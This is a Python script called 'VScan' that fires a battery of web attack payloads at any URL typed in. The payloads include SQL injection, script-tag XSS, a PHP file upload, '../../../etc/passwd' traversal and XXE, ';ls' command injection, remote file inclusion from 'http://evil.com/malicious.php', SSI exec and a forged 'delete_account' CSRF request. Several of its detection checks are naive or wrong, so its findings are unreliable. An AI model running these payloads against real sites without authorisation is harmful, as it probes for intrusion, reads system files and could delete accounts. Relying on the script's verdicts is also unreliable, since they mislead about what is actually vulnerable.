import requests
CYAN = '\033[96m\033[40m'
RESET = '\033[0m'

def check_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url)
    if "Error" in response.text:
        print(f"SQL Injection vulnerability found at: {url}")
    else:
        print(f"No SQL Injection vulnerability found at: {url}")

def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = f"{url}?input={payload}"
    response = requests.get(test_url)
    if payload in response.text:
        print(f"XSS vulnerability found at: {url}")
    else:
        print(f"No XSS vulnerability found at: {url}")

def check_file_upload(url):
    test_file = {'file': ('test.php', '<?php echo "Hello World!"; ?>', 'text/plain')}
    response = requests.post(url, files=test_file)
    if "Hello World!" in response.text:
        print(f"Insecure File Upload vulnerability found at: {url}")
    else:
        print(f"No Insecure File Upload vulnerability found at: {url}")

def check_directory_traversal(url):
    payload = "../../../etc/passwd"
    test_url = f"{url}?file={payload}"
    response = requests.get(test_url)
    if "root:" in response.text:
        print(f"Directory Traversal vulnerability found at: {url}")
    else:
        print(f"No Directory Traversal vulnerability found at: {url}")

def check_command_injection(url):
    payload = ";ls"
    test_url = f"{url}?input={payload}"
    response = requests.get(test_url)
    if "Permission denied" in response.text:
        print(f"Command Injection vulnerability found at: {url}")
    else:
        print(f"No Command Injection vulnerability found at: {url}")

def check_ssrf(url):
    test_url = f"{url}?url=http://localhost"
    response = requests.get(test_url)
    if "localhost" in response.text:
        print(f"Server-Side Request Forgery (SSRF) vulnerability found at: {url}")
    else:
        print(f"No Server-Side Request Forgery (SSRF) vulnerability found at: {url}")

def check_rfi(url):
    payload = "http://evil.com/malicious.php"
    test_url = f"{url}?file={payload}"
    response = requests.get(test_url)
    if "evil" in response.text:
        print(f"Remote File Inclusion (RFI) vulnerability found at: {url}")
    else:
        print(f"No Remote File Inclusion (RFI) vulnerability found at: {url}")

def check_xxe(url):
    payload = "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>"
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=payload, headers=headers)
    if "root:" in response.text:
        print(f"XML External Entity (XXE) vulnerability found at: {url}")
    else:
        print(f"No XML External Entity (XXE) vulnerability found at: {url}")

def check_csrf(url):
    payload = {'csrf_token': 'forged_token', 'action': 'delete_account'}
    response = requests.post(url, data=payload)
    if "Account deleted successfully" in response.text:
        print(f"Cross-Site Request Forgery (CSRF) vulnerability found at: {url}")
    else:
        print(f"No Cross-Site Request Forgery (CSRF) vulnerability found at: {url}")

def check_deserialization(url):
    payload = {'data': 'pickle_data_here'}
    response = requests.post(url, data=payload)
    if "Welcome, admin!" in response.text:
        print(f"Insecure Deserialization vulnerability found at: {url}")
    else:
        print(f"No Insecure Deserialization vulnerability found at: {url}")

def check_idor(url):
    test_url = f"{url}/user/profile?id=1"
    response = requests.get(test_url)
    if "Email: admin@example.com" in response.text:
        print(f"Insecure Direct Object Reference (IDOR) vulnerability found at: {url}")
    else:
        print(f"No Insecure Direct Object Reference (IDOR) vulnerability found at: {url}")

def check_ssi(url):
    payload = "<!--#exec cmd='ls' -->"
    test_url = f"{url}?file={payload}"
    response = requests.get(test_url)
    if "file1.txt" in response.text:
        print(f"Server-Side Include (SSI) Injection vulnerability found at: {url}")
    else:
        print(f"No Server-Side Include (SSI) Injection vulnerability found at: {url}")

def check_http_parameter_pollution(url):
    payload = {'param': ['value1', 'value2']}
    response = requests.get(url, params=payload)
    if "result" in response.text:
        print(f"HTTP Parameter Pollution (HPP) vulnerability found at: {url}")
    else:
        print(f"No HTTP Parameter Pollution (HPP) vulnerability found at: {url}")

def check_ssrf_dns_rebinding(url):
    test_url = f"{url}?url=http://your-controlled-domain"
    response = requests.get(test_url)
    if "your-controlled-domain" in response.text:
        print(f"Server-Side Request Forgery (SSRF) via DNS Rebinding vulnerability found at: {url}")
    else:
        print(f"No Server-Side Request Forgery (SSRF) via DNS Rebinding vulnerability found at: {url}")

def check_http_verb_tampering(url):
    response = requests.head(url)
    if "200 OK" in response.text:
        print(f"HTTP Verb Tampering vulnerability found at: {url}")
    else:
        print(f"No HTTP Verb Tampering vulnerability found at: {url}")

def ascii():
    print(CYAN + "@@@  @@@   @@@@@@    @@@@@@@   @@@@@@   @@@  @@@")
    print("@@@  @@@  @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@ @@@")
    print("@@!  @@@  !@@       !@@       @@!  @@@  @@!@!@@@")
    print("!@!  @!@  !@!       !@!       !@!  @!@  !@!!@!@!")
    print("@!@  !@!  !!@@!!    !@!       @!@!@!@!  @!@ !!@!")
    print("!@!  !!!   !!@!!!   !!!       !!!@!!!!  !@!  !!!")
    print(":!:  !!:       !:!  :!!       !!:  !!!  !!:  !!!")
    print(" ::!!:!       !:!   :!:       :!:  !:!  :!:  !:!")
    print("  ::::    :::: ::    ::: :::  ::   :::   ::   ::")
    print("   :      :: : :     :: :: :   :   : :  ::    : " + RESET)

def main():
    ascii()
    target_url = input("Enter the URL to scan: ")
    if target_url == '1':
        print("Thank you for using VScan!")
        return 0
    else:
        check_sql_injection(target_url)
        check_xss(target_url)
        check_file_upload(target_url)
        check_directory_traversal(target_url)
        check_command_injection(target_url)
        check_ssrf(target_url)
        check_rfi(target_url)
        check_xxe(target_url)
        check_csrf(target_url)
        check_deserialization(target_url)
        check_idor(target_url)
        check_ssi(target_url)
        check_http_parameter_pollution(target_url)
        check_ssrf_dns_rebinding(target_url)
        check_http_verb_tampering(target_url)

if __name__ == "__main__":
    main()

